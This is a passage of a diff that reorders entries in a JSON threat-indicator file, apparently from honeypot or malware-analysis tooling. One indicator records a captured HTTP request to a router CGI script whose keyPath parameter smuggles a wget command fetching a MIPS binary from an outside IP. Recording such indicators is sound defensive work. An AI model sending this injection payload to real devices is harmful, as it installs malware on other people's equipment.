@@ -1,15 +1,15 @@
 [
   {
-    "context": "Inbound payload hash (unknown)",
-    "source": "static_analysis",
-    "type": "hash",
-    "value": "20b5c42fd1280597e6d02c2bba17327396a0c09e9daa6394edb4fe825e833c49"
-  },
-  {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "GET /cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F31.56.39.XXX%2Fmemory_bin_dir%2Fmemory_load.mips+%3B+"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "20b5c42fd1280597e6d02c2bba17327396a0c09e9daa6394edb4fe825e833c49"
   },
   {
     "asn": "Microsoft Corporation",
